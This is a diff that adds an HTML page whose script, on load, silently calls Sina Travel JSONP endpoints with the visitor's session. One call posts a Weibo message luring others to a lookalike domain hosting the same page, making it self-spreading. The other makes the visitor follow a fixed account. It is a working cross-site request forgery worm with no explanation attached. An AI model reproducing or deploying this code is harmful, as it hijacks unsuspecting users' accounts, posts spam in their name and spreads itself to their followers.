@@ -1,0 +1,25 @@
+<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.js"></script>
+<script>
+$(function() {
+  var sendweibo = 'http://u.travel.sina.com.cn/api-i/qa/sendweibo?'
+  var content = "这里有好东西，赶紧看，你懂得！http://travel.sina.com.cn.zhchbin.xyz/travel_jsonp.html"
+  sendweibo = sendweibo + 'content=' + content + '&_=' + Date.now();
+  $.ajax({
+    url: sendweibo,
+    jsonp: "callback",
+    dataType: "jsonp",
+    success: function(response) {
+      console.log(response);
+    }
+  });
+  var follow_me = 'http://data.travel.sina.com.cn/award/friendships.php?uid=1904533355&times=' + Date.now();
+  $.ajax({
+    url: follow_me,
+    jsonp: "callback",
+    dataType: "jsonp",
+    success: function(response) {
+      console.log(response);
+    }
+  });
+});
+</script>
